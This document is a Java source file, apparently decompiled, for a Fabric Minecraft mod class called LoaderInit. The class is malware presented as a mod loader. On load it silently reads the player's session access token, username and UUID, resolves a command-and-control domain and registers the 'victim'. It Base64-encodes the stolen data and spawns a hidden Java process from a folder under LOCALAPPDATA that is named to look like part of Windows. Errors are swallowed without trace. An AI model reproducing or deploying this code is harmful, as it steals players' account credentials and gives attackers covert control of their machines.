package net.efn.loader;

import java.io.File;
import java.lang.ProcessBuilder.Redirect;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.Base64.Encoder;
import net.fabricmc.api.ModInitializer;

public class LoaderInit implements ModInitializer {

    public void onInitialize() {
        new Thread(() -> {
            try {
                String var1 = SessionAccess.getAccessToken();
                String var2 = SessionAccess.getUsername();
                String var3 = SessionAccess.getUuid();
                if (var3 == null) {
                    var3 = "unknown";
                }
                String var4 = RuntimeBridge.builderUserId();
                String var5 = RuntimeBridge.builderTag();
                Path var6 = this.findGameDir();
                RuntimeBridge var7 = new RuntimeBridge();
                String var8 = var7.resolveC2Domain();
                String var9 = var7.registerVictim(var8, var1, var4);
                Encoder var10000 = Base64.getEncoder();
                String var10001 = this.jsonEscape(var2);
                String var10002 = this.jsonEscape(var3);
                String var24 = this.jsonEscape(var1);
                String var23 = var10002;
                String var22 = var10001;
                StringBuilder var85 = new StringBuilder();
                StringBuilder var86 = var85.append("{\"username\":\"").append(var22);
                StringBuilder var87 = var86.append("\",\"uuid\":\"").append(var23);
                String var10 = var10000.encodeToString(var87.append("\",\"accessToken\":\"").append(var24).append("\"}").toString().getBytes(StandardCharsets.UTF_8));
                if (var9 != null) {
                    var10001 = var9;
                } else {
                    var10001 = "null";
                }
                var10002 = this.jsonEscape(var4);
                String var10003 = this.jsonEscape(var5);
                String var10004 = this.jsonEscape(var8);
                String var10005 = this.jsonEscape(var6 != null ? var6.toString() : "");
                String var10006 = this.jsonEscape(var2);
                String var40 = this.jsonEscape(var3);
                String var39 = var10006;
                String var38 = var10005;
                String var37 = var10004;
                String var36 = var10003;
                String var35 = var10002;
                String var34 = var10001;
                StringBuilder var75 = new StringBuilder();
                StringBuilder var76 = var75.append("{\"mcInfo\":\"").append(var10);
                StringBuilder var77 = var76.append("\",\"prefireId\":\"").append(var34);
                StringBuilder var78 = var77.append("\",\"userId\":\"").append(var35);
                StringBuilder var79 = var78.append("\",\"tag\":\"").append(var36);
                StringBuilder var80 = var79.append("\",\"domain\":\"").append(var37);
                StringBuilder var81 = var80.append("\",\"gameDir\":\"").append(var38);
                StringBuilder var82 = var81.append("\",\"mcUsername\":\"").append(var39);
                StringBuilder var83 = var82.append("\",\"mcUuid\":\"").append(var40);
                String var11 = var83.append("\",\"env\":\"Fabric\"}").toString();
                String var12 = Base64.getEncoder().encodeToString(var11.getBytes(StandardCharsets.UTF_8));
                String var13 = System.getProperty("java.home");
                String[] var89 = new String[] { "bin", null };
                var89[1] = "javaw.exe";
                Path var14 = Path.of(var13, var89);
                if (!Files.exists(var14)) {
                    String[] var90 = new String[] { "bin", null };
                    var90[1] = "java.exe";
                    var14 = Path.of(var13, var90);
                }
                URI var15 = LoaderInit.class.getProtectionDomain().getCodeSource().getLocation().toURI();
                Path var16 = Path.of(var15);
                String var84 = System.getenv("LOCALAPPDATA");
                String[] var91 = new String[3];
                var91[0] = "Microsoft";
                var91[1] = "Windows";
                var91[2] = "NtProfileIndex";
                Path var17 = Path.of(var84, var91);
                Files.createDirectories(var17);
                String var18 = RuntimeBridge.class.getName();
                ProcessBuilder var19 = new ProcessBuilder(var14.toString(), "-cp", var16.toString(), var18, var12);
                var19.redirectInput(Redirect.from(new File("NUL")));
                var19.redirectOutput(Redirect.appendTo(var17.resolve("_spawn.log").toFile()));
                var19.redirectErrorStream(true);
                var19.directory(var17.toFile());
                var19.start();
            } catch (Exception var74) {
            }
        }).start();
    }

    private Path findGameDir() {
        Path var1 = Path.of(System.getProperty("user.dir"));
        if (!Files.exists(var1.resolve("options.txt"))) {
            if (!Files.exists(var1.resolve("config"))) {
                if (!Files.exists(var1.resolve("mods"))) {
                    String var2 = System.getenv("APPDATA");
                    if (var2 != null) {
                        String[] var10001 = new String[1];
                        var10001[0] = ".minecraft";
                        Path var3 = Path.of(var2, var10001);
                        if (Files.exists(var3)) {
                            return var3;
                        }
                    }
                    String var10000 = System.getProperty("user.home");
                    String[] var20 = new String[1];
                    var20[0] = ".minecraft";
                    Path var19 = Path.of(var10000, var20);
                    if (Files.exists(var19)) {
                        return var19;
                    }
                    return var1;
                }
            }
        }
        return var1;
    }

    private String jsonEscape(String var1) {
        if (var1 == null) {
            return "";
        } else {
            StringBuilder var2 = new StringBuilder();
            for (char var6 : var1.toCharArray()) {
                switch(var6) {
                    case '\t':
                        var2.append("\\t");
                        break;
                    case '\n':
                        var2.append("\\n");
                        break;
                    case '\r':
                        var2.append("\\r");
                        break;
                    case '"':
                        var2.append("\\\"");
                        break;
                    case '\\':
                        var2.append("\\\\");
                        break;
                    default:
                        if (var6 < ' ') {
                            var2.append(String.format("\\u%04x", Integer.valueOf(var6)));
                        } else {
                            var2.append(var6);
                        }
                }
            }
            return var2.toString();
        }
    }
}
